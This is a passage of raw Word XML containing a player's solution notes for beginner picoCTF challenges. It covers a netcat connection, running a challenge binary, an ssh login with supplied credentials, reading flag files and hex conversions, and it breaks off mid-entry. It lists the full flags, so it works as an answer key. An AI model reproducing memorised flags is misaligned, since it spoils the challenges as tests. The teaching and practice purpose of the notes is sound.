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A589B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t>1. nice netcat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D45E93B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591"/>
    <w:p w14:paraId="5E115BBE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591"/>
    <w:p w14:paraId="5AF963A9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">run : nc  ip  port </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7129DB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>nc mercury.picoctf.net 43239</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5F79C6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>Get: Asicii code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CF51C8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>convert asic to text :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D814FFB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t>picoCTF{g00d_k1tty!_n1c3_k1tty!_7c0821f5}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E6205C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591"/>
    <w:p w14:paraId="2B742A89" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t>2. tap tap attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22909DB1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t>tap to complete file name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20FE5390" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">download the zip file, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D880FF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t>cmd: unzip  filename</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D98DA1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">open directories, till find an executable  file </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601B2EE8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">$ ./fang-of-haynekhtnamet </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE356D2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t>picoCTF{l3v3l_up!_t4k3_4_r35t!_524e3dc4}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65867647" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591"/>
    <w:p w14:paraId="72746046" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591"/>
    <w:p w14:paraId="759E5F81" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Magikarp Ground Mission</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C2BE4A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>User name : ctf-player</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650B0269" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Password : 6d448c9c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726854B4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>ssh ctf-player@venus.picoctf.net -p 55246</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27866013" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="0" w:author="Unknown Author" w:date="2022-08-26T10:13:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
          <w:t xml:space="preserve">ssh  </w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:user@host" \h </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="1" w:author="Unknown Author" w:date="2022-08-26T10:13:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
          <w:t>user@host</w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK \h </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="2" w:author="Unknown Author" w:date="2022-08-26T10:13:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:ins w:id="3" w:author="Unknown Author" w:date="2022-08-26T10:14:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
          <w:t xml:space="preserve"> -port 55246</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="692074EB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="4" w:author="Unknown Author" w:date="2022-08-26T10:16:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="5" w:author="Unknown Author" w:date="2022-08-26T10:13:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
          <w:delText>ssh ctf-player@venus.picoctf.net -p 6d448c9c</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1D32482B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="6" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="7" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="2" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5CEE026D" wp14:editId="31DFF49A">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="column">
                <wp:posOffset>455930</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="paragraph">
                <wp:posOffset>635</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="3592195" cy="2819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3592195" cy="2819400"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:anchor>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2D076992" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="8" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1069D89D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="9" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47A7B8F4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="10" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="086F5225" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="11" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31AEFF54" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="12" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21860199" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="13" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CF81A62" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="14" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4518E63C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="15" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67457452" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="16" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E8C5689" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="17" w:author="Unknown Author" w:date="2022-08-26T10:17:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18E0C36D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="18" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall$ ls</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="01B5F79B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="19" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>1of3.flag.txt  instructions-to-2of3.txt</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3CE8A1F7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="20" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">ctf-player@pico-chall$ cat 1of3.flag.txt </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="439A6476" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="21" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>picoCTF{xxsh_</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="150CEAA5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="22" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">ctf-player@pico-chall$ cat instructions-to-2of3.txt </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2B92855F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="23" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>Next, go to the root of all things, more succinctly `/`</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2F1367A7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="24" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall$ cd /</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="167C38DA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="25" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall$ ls</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="369DCC1A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="26" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>2of3.flag.txt  dev   instructions-to-3of3.txt  media  proc  sbin  tmp</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5EABD12B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="27" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>bin</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
          <w:t xml:space="preserve">       etc   lib</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
          <w:t xml:space="preserve">       mnt    root  srv   usr</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="008442A8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="28" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>boot</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
          <w:t xml:space="preserve">       home  lib64</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:tab/>
          <w:t xml:space="preserve">       opt    run   sys   var</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6CFDC6F3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="29" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">ctf-player@pico-chall$ cat 2of3.flag.txt </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5EC640A7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="30" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>0ut_0f_\/\/4t3r_</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="76AB2D18" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="31" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">ctf-player@pico-chall$ cat instructions-to-3of3.txt </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1FEDD72D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="32" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>Lastly, ctf-player, go home... more succinctly `~`</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="02648ABB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="33" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall$ cd ~</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="662ACFF1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="34" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>ctf-player@pico-chall$ ls</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1378509C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="35" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>3of3.flag.txt  drop-in</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="09B9250D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="36" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">ctf-player@pico-chall$ cat 3of3.flag.txt </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1ECF15ED" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="37" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>5190b070}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0988F367" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="38" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t xml:space="preserve">ctf-player@pico-chall$ </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="65EE62C6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="39" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z"/>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05503427" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:ins w:id="40" w:author="Unknown Author" w:date="2022-08-26T10:20:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>picoCTF{xxsh_</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="41" w:author="Unknown Author" w:date="2022-08-26T10:22:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>0ut_0f_\/\/4t3r_</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="42" w:author="Unknown Author" w:date="2022-08-26T10:21:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:t>5190b070}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="70ED770F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60FD71CF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Lets Warm Up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7603F9AC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118E35C5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF{p}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B18AD4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>0x70 =B01110000 =64+32+16=112 =p</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1127ACB4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Warmed Up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A192605" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>What is 0x3D (base 16) in decimal (base 10)?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D4633B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">0x3D =B00111101 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BEFD154" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
